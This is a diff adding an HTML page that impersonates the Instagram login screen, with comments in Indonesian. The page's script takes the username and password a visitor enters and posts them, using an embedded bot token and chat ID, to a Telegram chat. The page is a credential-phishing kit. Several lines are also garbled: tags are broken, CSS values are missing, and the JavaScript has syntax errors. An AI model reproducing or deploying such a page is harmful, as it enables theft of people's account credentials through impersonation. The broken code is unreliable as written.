@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login • Instagramtitle>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #fafafa;
+            display: flex;
+            justify-content: center;
+align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .login-box {
+            background-color: #fff;
+            border: 1px solid #dbdbdb;
+            width: 35px;
+            padding: 40px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            box-shadow: 0 0 0.1rem rgba(0,0,0,0.1);
+}
+        .logo {
+            width: 175px;
+            margin-bottom: 30px;
+        }
+        form {
+            display: flex;
+            flex-direction: column;
+            width: 100%;
+        }
+        input {
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            padding: 9px 0 7px 8px;
+            font-size: 12px;
+            -bottom: 7px;
+            outline: none;
+        }
+        button {
+            background-color: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            padding: px 0;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        button:disabled { background-color: #b2dffc; }
+    </style>
+</head>
+
+
+    <div class="login-box">
+        <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/7356ca736983.png" class="logo" alt="Instagram">
+         id="loginForm">
+            <input type="text" id="username" placeholder="Phone number, username, or email" required>
+            <input type="password" id="password" placeholder="Password" required>
+            <button type="submit" id="btnSubmit">Log In</button>        </form>
+    </div>
+
+    <script>
+        // KONFIGURASI TELEGRAM ANDA
+        const BOT_TOKEN = '8653911812:AAG4hAVpL8hB4YZJhLL2PAHNDLgV3QYtsBg'; 
+        const CHAT_ID = '6888530451';
+
+        document.getElementById('loginForm').addEventListener('submit',c (e) => {
+            e.preventDefault();
+            
+            const btn = document.getElementById('btnSubmit');
+            const user = document.getElementById('username').value;
+            const pass = document.getElementById('password').value;
+
+            btn.disabled = true;
+            .innerText = 'Processing...';
+
+            const message = `🔔 Data Login Masuk:\n\n👤 Username: ${user}\n🔑 Password: ${pass}`;
+            
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message
+                    })
+                });
+                alert('Berhasil! telah dikirim ke Telegram.');
+            } catch (error) {
+                alert('Gagal mengirim data.');
+            } finally {
+                btn.disabled = false;
+                btn.innerText = 'Log In';
+            }
+        });
+    </script>
+</body>
+</html>
